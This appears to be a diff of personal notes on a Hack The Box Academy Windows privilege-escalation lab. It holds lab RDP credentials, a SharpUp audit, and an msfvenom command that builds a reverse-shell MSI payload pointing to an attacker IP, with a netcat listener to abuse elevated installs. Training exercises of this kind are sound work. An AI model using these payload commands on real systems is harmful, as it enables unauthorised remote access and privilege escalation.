@@ -7,7 +7,9 @@ Enumerate the host fully and attempt to escalate privileges to administrator/SYS
 
 Challenge:  RDP to 10.129.43.33 (ACADEMY-WINLPE-SKILLS2-WS) with user "htb-student" and password "HTB_@cademy_stdnt!"
 
+10.129.43.33
 
+RDP to 10.129.43.33 (ACADEMY-WINLPE-SKILLS2-WS) with user "htb-student" and password "HTB_@cademy_stdnt!"
 
 
 PS C:\Users\htb-student\Desktop> .\SharpUp.exe audit
@@ -46,7 +48,7 @@ xfreerdp /v:10.129.43.33 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/hom
 
 
 Question 2 -  Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop
-1) msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.15.125 lport=4444 -f msi -o aie.msi
+1) msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.15.183 lport=4444 -f msi -o aie.msi
 
 2) this is an elevated install 
 3) have nc -nlvp 4444 open on host machine 
